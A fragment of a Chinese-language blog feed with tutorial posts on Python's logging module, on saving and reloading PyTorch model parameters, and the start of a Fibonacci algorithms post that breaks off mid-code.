        <content type="html"><![CDATA[<iframe src="//player.bilibili.com/player.html?aid=883945077&cid=213322412&page=1&high_quality=1" allowfullscreen="allowfullscreen" width="100%" height="700" scrolling="no" frameborder="0" sandbox="allow-top-navigation allow-same-origin allow-forms allow-scripts"> </iframe><h2 id="日志级别"><a href="#日志级别" class="headerlink" title="日志级别"></a>日志级别</h2><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/0.png"></p><blockquote><p>默认是WARNING，投入生产环境可以只输出大于INFO级别的日志</p></blockquote><h2 id="简单实例"><a href="#简单实例" class="headerlink" title="简单实例"></a>简单实例</h2><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/1.png"><br>可以指定输出级别：<br>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logging.basicConfig(level=logging.DEBUG)</span><br></pre></td></tr></table></figure><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/2.png"></p><blockquote><p>logging之间的输出顺序是一定按顺序的，但是和print()的输出顺序是不固定的</p></blockquote><p>其中：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/3.png"><br>为记录器</p><h2 id="将日志输出保存到log文件"><a href="#将日志输出保存到log文件" class="headerlink" title="将日志输出保存到log文件"></a>将日志输出保存到log文件</h2><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/4.png"><br>默认模式是追加模式，如果不想追加：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/5.png"><br>即先清空再写入</p><h2 id="向日志输出变量"><a href="#向日志输出变量" class="headerlink" title="向日志输出变量"></a>向日志输出变量</h2><p>如下：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/6.png"><br><strong>也可以用%运算符来传递变量：</strong><br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/7.png"><br>.format(元组)也是可以的：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/8.png"><br>或者可以字符串前加f：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/9.png">​</p><h2 id="指定公共信息"><a href="#指定公共信息" class="headerlink" title="指定公共信息"></a>指定公共信息</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%()s</span><br></pre></td></tr></table></figure><p>将想要添加的公共信息写在()中即可，如：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/10.png"></p><h2 id="logging高级应用"><a href="#logging高级应用" class="headerlink" title="logging高级应用"></a>logging高级应用</h2><p>logging模块采用了模块化设计，主要包含四种组件:</p><ul><li>Loggers:记录器，提供应用程序代码能直接使用的接口; </li><li>Handlers: 处理器，将记录器产生的日志发送至目的地; </li><li>Filters: 过滤器，提供更好的粒度控制，决定哪些日志会被输出； </li><li>Formatters: 格式化器，设置日志内容的组成结构和消息字段。<h3 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h3><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/11.png"><h3 id="记录器"><a href="#记录器" class="headerlink" title="记录器"></a>记录器</h3><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/12.png"><h3 id="Handlers处理器"><a href="#Handlers处理器" class="headerlink" title="Handlers处理器"></a>Handlers处理器</h3>它们将日志分发到不同的目的地。可以是文件、标准输出、 邮件、或者通过socket、 http等协议发送到任何地方。<br>有以下实例：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/13.png"><br>encoding：指定字符集<br>delay：指定缓存</li></ul><p><strong>所有的handler都可以用setFormatter()设置当前handler对象使用的消息格式</strong>​<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/14.png"><br>TimedRotatingFileHandler可以根据时间生成对应的log文件，避免一个log文件过大</p><h3 id="Formatters格式"><a href="#Formatters格式" class="headerlink" title="Formatters格式"></a>Formatters格式</h3><p>Formatter对象用来最终设置日志信息的顺序、结构和内容。<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/15.png"><br>可添加的公共信息字符串包扩以下：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/16.png"></p><h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><h4 id="生成记录器"><a href="#生成记录器" class="headerlink" title="生成记录器"></a>生成记录器</h4><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/17.png"></p><h4 id="更改日志级别"><a href="#更改日志级别" class="headerlink" title="更改日志级别"></a>更改日志级别</h4><p>使用setLevel()<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/18.png"></p><h4 id="生成handler"><a href="#生成handler" class="headerlink" title="生成handler"></a>生成handler</h4><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/19.png"></p><h4 id="生成formatter"><a href="#生成formatter" class="headerlink" title="生成formatter"></a>生成formatter</h4><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/20.png"></p><h4 id="给handler处理器设置格式"><a href="#给handler处理器设置格式" class="headerlink" title="给handler处理器设置格式"></a>给handler处理器设置格式</h4><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/21.png"></p><h4 id="logger记录器设置handler处理器"><a href="#logger记录器设置handler处理器" class="headerlink" title="logger记录器设置handler处理器"></a>logger记录器设置handler处理器</h4><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/22.png">​</p><h4 id="打印日志的代码"><a href="#打印日志的代码" class="headerlink" title="打印日志的代码"></a>打印日志的代码</h4><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/23.png"></p><h4 id="日志等级关系"><a href="#日志等级关系" class="headerlink" title="日志等级关系"></a>日志等级关系</h4><p>handler的setlevel设置的是这个处理器生成的日志级别，上面的logger设置的是输出级别。<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/24.png"><br>控制台输出：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/25.png"><br>文件输出：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/26.png"></p><blockquote><p>输出中没有对齐，可以通过格式化字符串来对齐：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/27.png"><br>（数字8前加‘-’可以左对齐）</p></blockquote><h3 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h3><blockquote><p>以记录器的名字来过滤</p></blockquote><h4 id="定义过滤器"><a href="#定义过滤器" class="headerlink" title="定义过滤器"></a>定义过滤器</h4><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/28.png"><br>当前logger叫做：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/29.png"><br>所以被过滤掉了，输出为：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/30.png"><br>将此logger改名为<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/31.png"><br>可以看到正常输出了：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/32.png"><br>handler也可以加上过滤器：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/33.png"><br>此时logger设置为：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/34.png"><br>输出为：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/35.png"><br>而文件里为空</p><h3 id="使用配置文件"><a href="#使用配置文件" class="headerlink" title="使用配置文件"></a>使用配置文件</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><blockquote><p>其中logger中的root必须保留</p></blockquote><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/36.png"></p><h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/37.png"><br>qualname相当于getLogger(‘applog’)<br>propagate：继承关系，一般写0<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/38.png"><br>‘midnight’是指按时间每天分割一次log，图中表示午夜过了1秒后分割，最后的0表示持续保留，若想保留30天则改成30即可<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/39.png"></p><h4 id="调用配置"><a href="#调用配置" class="headerlink" title="调用配置"></a>调用配置</h4><p><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/40.png"><br>输出：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/41.png"></p><h4 id="记录异常"><a href="#记录异常" class="headerlink" title="记录异常"></a>记录异常</h4><p>记录异常需要保留发生异常的栈信息：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/42.png"><br>文件里：<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/43.png"></p><h3 id="字典方式的配置"><a href="#字典方式的配置" class="headerlink" title="字典方式的配置"></a>字典方式的配置</h3><p>只要传入的格式是字典格式不论配置是json还是xml等都可以读取<br><img src="http://106.12.125.218/medias/medias/Python%E6%A0%87%E5%87%86%E5%BA%93logging%E6%95%99%E7%A8%8B/44.png"></p>]]></content>
      
      
      <categories>
          
          <category> TOOLS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tool </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文梳理pytorch保存和重载模型参数攻略</title>
      <link href="/2021/08/07/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/"/>
      <url>/2021/08/07/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/</url>
      
        <content type="html"><![CDATA[<blockquote><p>训练过程中保存模型参数，就不怕断电了——沃资基·索德</p></blockquote><p>在训练完成之前，我们需要每隔一段时间保存模型当前参数值，一方面可以<strong>防止断电重跑</strong>，另一方面可以<strong>观察不同迭代次数模型的表现</strong>；在训练完成以后，我们需要保存模型参数值<strong>用于后续的测试过程</strong>。所以，保存的对象包含网络参数值、优化器参数值、epoch值等等。</p><h2 id="一、定义一个容易识别的网络"><a href="#一、定义一个容易识别的网络" class="headerlink" title="一、定义一个容易识别的网络"></a>一、定义一个容易识别的网络</h2><p>在正式介绍模型的保存和加载之前，我们首先定义一个基本的网络Net，它只包含一个全连接层：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Net</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Net, self).__init__()</span><br><span class="line">        self.layer = nn.Linear(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        self.layer.weight = nn.Parameter(torch.FloatTensor([[<span class="number">10</span>]]))</span><br><span class="line">        self.layer.bias = nn.Parameter(torch.FloatTensor([<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">         y = self.layer(x)</span><br><span class="line">        <span class="keyword">return</span> y</span><br></pre></td></tr></table></figure><p>我<strong>将全连接的权重w和偏差b分别设置为10和1</strong>，全连接的计算方式如下：<br><img src="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/0.png"><br>假设输入x=1，可以知道y值为11：<br><img src="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/1.png"><br>测试一下输出是不是11，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">x = torch.FloatTensor([[<span class="number">1</span>]])</span><br><span class="line">net = Net()</span><br><span class="line">out = net(x)</span><br><span class="line"><span class="built_in">print</span>(out)</span><br></pre></td></tr></table></figure><p>输出：tensor([[11.]], grad_fn=<AddmmBackward>)，说明上述计算是正确的。不采用参数随机初始化，而是用特殊的数值初始化，是因为我们希望<strong>重载模型的时候，能够从特殊数值一眼判断出保存和重载过程是否正确</strong>，也可以把权重设置为一张图片数值，然后判断加载的参数值能不能恢复原图。</p><h2 id="二、保存Net的参数值"><a href="#二、保存Net的参数值" class="headerlink" title="二、保存Net的参数值"></a>二、保存Net的参数值</h2><p>保存模型参数之前，需要知道<strong>Net的参数值存储在其state_dict（状态字典）属性中</strong>，我们查看一下net的state_dict包含哪些参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(net.state_dict())</span><br></pre></td></tr></table></figure><p>我们将会得到<strong>net包含的所有参数名称与参数值</strong>：<br><img src="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/2.png"><br>包含一个weight和一个bias，对应的值分别是10和1，和我们之前定义的全连接层一致。我们需要保存的就是这个state_dict，保存的函数为“torch.save()”，<strong>参数是我们需要保存的dict和存储路径</strong>：<br>torch.save(obj=net.state_dict(), f=”models/net.pth”)<br>现在，同级目录models下将会出现net.pth文件，pth文件中的内容就是net的参数名称和值对应的state_dict，如下：<br><img src="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/3.png"></p><h2 id="三、加载Net参数值并用于新的模型"><a href="#三、加载Net参数值并用于新的模型" class="headerlink" title="三、加载Net参数值并用于新的模型"></a>三、加载Net参数值并用于新的模型</h2><p>最后一个步骤就是从pth文件中重新获取Net参数值，并把参数值装载到新定义的Model对象中。这里我们重新定义一个结构和Net类相同的类Model，<strong>区别仅仅是Model参数初始值和Net不同</strong>，代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Model</span>(<span class="params">nn.Module</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">super</span>(Model, self).__init__()</span><br><span class="line">        self.layer = nn.Linear(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        self.layer.weight = nn.Parameter(torch.FloatTensor([[<span class="number">0</span>]]))</span><br><span class="line">        self.layer.bias = nn.Parameter(torch.FloatTensor([<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">forward</span>(<span class="params">self, x</span>):</span></span><br><span class="line">        out = self.layer(x)</span><br><span class="line">        <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure><p>这里将Model的初始值权重w和偏差都设置为0，查看其state_dict：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model = Model()</span><br><span class="line"><span class="built_in">print</span>(model.state_dict())</span><br></pre></td></tr></table></figure><p>得到的w和b值与预期相同，均为0，如下：<br><img src="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/4.png"><br>现在，我们将model对象的参数值设置为net.pth中的值，需要<strong>使用“model.load_state_dict()”函数重置model的参数值为”torch.load(models/ net.pth)”中的参数值</strong>，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">model.load_state_dict(torch.load(<span class="string">&quot;models/net.pth&quot;</span>))</span><br><span class="line"><span class="built_in">print</span>(model.state_dict())</span><br></pre></td></tr></table></figure><p>至此，model的w和b值就不再是0了，而是net中w和b对应的10和1，如下：<br><img src="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/5.png"><br>其中参数值重载的核心函数为“model.load_state_dict()”，每个继承自nn.Module的网络都能通过这个函数设定参数值。</p><h2 id="四、优化器与epoch的保存"><a href="#四、优化器与epoch的保存" class="headerlink" title="四、优化器与epoch的保存"></a>四、优化器与epoch的保存</h2><p>保存优化器参数值和epoch值的主要目的是用于继续训练，保存的流程依旧是先“torch.save()”再“torch.load_state_dict()”，我们首先定义一个Adam优化器、一个任意的epoch值与net如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net = Net()</span><br><span class="line">Adam = optim.Adam(params=net.parameters(), lr=<span class="number">0.001</span>, betas=(<span class="number">0.5</span>, <span class="number">0.999</span>))</span><br><span class="line">epoch = <span class="number">96</span></span><br></pre></td></tr></table></figure><p>现在，<strong>创建一个字典来保存所有的对象，并用save函数保存这个字典</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">all_states = &#123;<span class="string">&quot;net&quot;</span>: net.state_dict(), <span class="string">&quot;Adam&quot;</span>: Adam.state_dict(), <span class="string">&quot;epoch&quot;</span>: epoch&#125;</span><br><span class="line">torch.save(obj=all_states, f=<span class="string">&quot;models/all_states.pth&quot;</span>)</span><br></pre></td></tr></table></figure><p>所有的对象都被保存到models文件夹下了：<br><img src="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/6.png"><br>可以使用load()函数把所有的对象再次提取出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reload_states = torch.load(<span class="string">&quot;models/all_states.pth&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(reload_states)</span><br></pre></td></tr></table></figure><p>得到的所有参数如下：<br><img src="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/7.png"><br>补充：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">checkpoint = torch.load(<span class="string">&quot;models/all_states.pth&quot;</span>)</span><br><span class="line">model.load_state_dict(checkpoint[<span class="string">&#x27;model&#x27;</span>])</span><br><span class="line">optimizer.load_state_dict(checkpoint[<span class="string">&#x27;optimizer&#x27;</span>])</span><br><span class="line">start_epoch = checkpoint[<span class="string">&#x27;epoch&#x27;</span>]+<span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><p>pytorch中state_dict()和load_state_dict()函数配合使用可以实现状态的获取与重载，load()和save()函数配合使用可以实现参数的存储与读取。其中最重要的部分是“字典”的概念，因为参数对象的存储是需要“名称”——“值”对应（即键值对），读取时也是通过键值对读取的。</p><p><strong><em>参考：</em></strong><br><a href="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/8.png">https://zhuanlan.zhihu.com/p/94971100</a><br><a href="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/9.png">https://www.pytorchtutorial.com/pytorch-note5-save-and-restore-models/</a><br><a href="http://106.12.125.218/medias/medias/%E4%B8%80%E6%96%87%E6%A2%B3%E7%90%86pytorch%E4%BF%9D%E5%AD%98%E5%92%8C%E9%87%8D%E8%BD%BD%E6%A8%A1%E5%9E%8B%E5%8F%82%E6%95%B0%E6%94%BB%E7%95%A5/10.png">https://blog.csdn.net/Code_Mart/article/details/88254444</a></p>]]></content>
      
      
      <categories>
          
          <category> DL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python算法——长期更新</title>
      <link href="/2021/07/28/Python%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"/>
      <url>/2021/07/28/Python%E7%AE%97%E6%B3%95%E2%80%94%E2%80%94%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="类型提示"><a href="#类型提示" class="headerlink" title="类型提示"></a>类型提示</h2><p>就是说一下这个变量是什么类型用的，写了也不编译，就到时候能给检查一下，不容易出错，这样写的代码也好读</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repeat</span>(<span class="params">item, times</span>):</span></span><br><span class="line"><span class="comment">##添加类型提示</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">repeat</span>(<span class="params">item: <span class="type">Any</span>,times:<span class="built_in">int</span></span>) -&gt;<span class="type">List</span>[<span class="type">Any</span>]:</span></span><br></pre></td></tr></table></figure><h2 id="第1章"><a href="#第1章" class="headerlink" title="第1章"></a>第1章</h2><h3 id="斐波那契"><a href="#斐波那契" class="headerlink" title="斐波那契"></a>斐波那契</h3><h4 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">num: <span class="built_in">int</span></span>) -&gt;<span class="built_in">int</span>:</span></span><br><span class="line">    <span class="keyword">if</span> num==<span class="number">1</span> <span class="keyword">or</span> num ==<span class="number">0</span>:</span><br><span class="line">     <span class="keyword">return</span> num</span><br><span class="line">    <span class="keyword">return</span> fib(num-<span class="number">1</span>)+fib(num-<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(fib(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><h4 id="记忆化搜索"><a href="#记忆化搜索" class="headerlink" title="记忆化搜索"></a>记忆化搜索</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span></span><br><span class="line">memo :<span class="type">Dict</span>[<span class="built_in">int</span>,<span class="built_in">int</span>] = &#123;<span class="number">0</span>:<span class="number">0</span>,<span class="number">1</span>:<span class="number">1</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">num</span>):</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">not</span> <span class="keyword">in</span> memo:</span><br><span class="line">        memo[num] = fib(num-<span class="number">1</span>) + fib(num-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> memo[num]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(fib(<span class="number">50</span>))</span><br></pre></td></tr></table></figure><h4 id="装饰器自动记忆化"><a href="#装饰器自动记忆化" class="headerlink" title="装饰器自动记忆化"></a>装饰器自动记忆化</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> lru_cache</span><br><span class="line"><span class="meta">@lru_cache(<span class="params">maxsize=<span class="literal">None</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">2</span> :</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">return</span> fib(n-<span class="number">1</span>)+fib(n-<span class="number">2</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(fib(<span class="number">5</span>))</span><br></pre></td></tr></table></figure><h4 id="迭代v1"><a href="#迭代v1" class="headerlink" title="迭代v1"></a>迭代v1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 